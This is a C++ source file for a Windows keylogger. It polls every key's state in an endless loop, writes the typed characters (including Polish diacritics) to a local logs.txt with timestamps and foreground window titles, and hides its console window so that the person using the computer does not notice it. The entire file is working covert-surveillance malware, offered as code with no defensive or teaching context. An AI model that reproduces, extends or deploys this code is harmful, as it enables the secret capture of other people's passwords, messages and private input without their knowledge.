#include <windows.h>
#include <iostream>
#include <string>
#include <fstream>
#include <ctime>

HWND hCurrentWindow;
char sWindowTitle[256];
bool is_capslock = false;

int save(int key)
{
	std::ofstream out_file;
	out_file.open("logs.txt", std::ios_base::app);
	std::string sLogs = "";
	time_t t = time(0);

	if (hCurrentWindow != GetForegroundWindow())
	{
		hCurrentWindow = GetForegroundWindow();
		char title[256];
		GetWindowTextA(hCurrentWindow, title,sizeof(title));

		sLogs += "\n\n";
		sLogs += asctime(localtime(&t));
		sLogs += "Window name: ";
		sLogs += title;
		sLogs += "]\n";
	}

	if ((GetAsyncKeyState(VK_CAPITAL) & 0x0001) != 0){
		is_capslock = true;
	}

	switch (key) {
	case 1:
		return 0;
		break;
	case 2:
		return 0;
		break;
	//-----------------------------------------------------------------------
	//End of mouse
	//-----------------------------------------------------------------------
	case 96:
		sLogs += "0";
		break;
	case 97:
		sLogs += "1";
		break;
	case 98:
		sLogs += "2";
		break;
	case 99:
		sLogs += "3";
		break;
	case 100:
		sLogs += "4";
		break;
	case 101:
		sLogs += "5";
		break;
	case 102:
		sLogs += "6";
		break;
	case 103:
		sLogs += "7";
		break;
	case 104:
		sLogs += "8";
		break;
	case 105:
		sLogs += "9";
		break;
	//-----------------------------------------------------------------------
	//End of numpad digits
	//-----------------------------------------------------------------------
	case 48:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += ")";
		}
		else
			sLogs += "0";
		break;
	case 49:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "!";
		}
		else
			sLogs += "1";
		break;
	case 50:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "@";
		}
		else
			sLogs += "2";
		break;
	case 51:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "#";
		}
		else
			sLogs += "3";
		break;
	case 52:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "$";
		}
		else
			sLogs += "4";
		break;
	case 53:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "%";
		}
		else
			sLogs += "5";
		break;
	case 54:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "^";
		}
		else
			sLogs += "6";
		break;
	case 55:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "&";
		}
		else
			sLogs += "7";
		break;
	case 56:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "*";
		}
		else
			sLogs += "8";
		break;
	case 57:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "(";
		}
		else
			sLogs += "9";
		break;
	//-----------------------------------------------------------------------
	//End of digits
	//-----------------------------------------------------------------------
	case 65:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "Ą";
			}
			else 
				sLogs += "A";
		} 
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "ą";
			}
			else
				sLogs += "a";
		}
		break;
	case 66:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "B";
		}
		else
			sLogs += "b";
		break;
	case 67:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "Ć";
			}
			else {
				sLogs += "C";
			}
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "ć";
			}
			else {
				sLogs += "c";
			}
		}
		break;
	case 68:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "D";
		}
		else
			sLogs += "d";
		break;
	case 69:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "Ę";
			}
			else {
				sLogs += "E";
			}
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "ę";
			}
			else {
				sLogs += "e";
			}
		}
		break;
	case 70:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "F";
		}
		else
			sLogs += "f";
		break;
	case 71:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "G";
		}
		else
			sLogs += "g";
		break;
	case 72:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "H";
		}
		else
			sLogs += "h";
		break;
	case 73:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "I";
		}
		else
			sLogs += "i";
		break;
	case 74:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "J";
		}
		else
			sLogs += "j";
		break;
	case 75:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "K";
		}
		else
			sLogs += "k";
		break;
	case 76:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "Ł";
			}
			else {
				sLogs += "L";
			}
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "ł";
			}
			else {
				sLogs += "l";
			}
		}
		break;
	case 77:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "M";
		}
		else
			sLogs += "m";
		break;
	case 78:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "Ń";
			}
			else {
				sLogs += "N";
			}
			break;
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "ń";
			}
			else {
				sLogs += "n";
			}
		}
		break;
	case 79:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "Ó";
			}
			else {
				sLogs += "O";
			}
			break;
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "ó";
			}
			else {
				sLogs += "o";
			}
		}
		break;
	case 80:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "P";
			break;
		}
		else
			sLogs += "p";
		break;
	case 81:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "Q";
			break;
		}
		else
			sLogs += "q";
		break;
	case 82:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "R";
			break;
		}
		else
			sLogs += "r";
		break;
	case 83:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "Ś";
			}
			else {
				sLogs += "S";
			}
			break;
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "ś";
			}
			else {
				sLogs += "s";
			}
		}
		break;
	case 84:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "T";
			break;
		}
		else
			sLogs += "t";
		break;
	case 85:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "U";
			break;
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "€";
			}
			else {
				sLogs += "u";
			}
		}
		break;
	case 86:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "V";
			break;
		}
		else
			sLogs += "v";
		break;
	case 87:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "W";
			break;
		}
		else
			sLogs += "w";
		break;
	case 88:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "Ź";
			}
			else {
				sLogs += "X";
			}
			break;
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "ź";
			}
			else {
				sLogs += "x";
			}
		}
		break;
	case 89:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "Y";
			break;
		}
		else
			sLogs += "y";
		break;
	case 90:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "Ż";
			}
			else {
				sLogs += "Z";
			}
			break;
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "ż";
			}
			else {
				sLogs += "z";
			}
		}
	//-----------------------------------------------------------------------
	//End of A-Z characters
	//-----------------------------------------------------------------------
	case 13:
		sLogs += "\n";
		break;
	case 20:
		if (is_capslock == false) {
			is_capslock = true;
			sLogs += "[CapsLock]";
		}
		else {
			is_capslock = false;
			sLogs += "[/CapsLock]";
		}
		break;
	case 32:
		sLogs += " ";
		break;
	default:
		break;
	}
	
	out_file << sLogs;
	out_file.close();
	return 0;
}

void stealth() {
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("consoleWindowClass", NULL);
	ShowWindow(stealth, 0);
}

int main(int argc, char * argv[]) {
	//path to our .exe is in argv[0]
	stealth();
	char i;
	while (1) {
		for (i = 8; i <= 190; i++) {
			if (GetAsyncKeyState(i) == -32767)
				save(i);
		}
	}
	return 0;
}
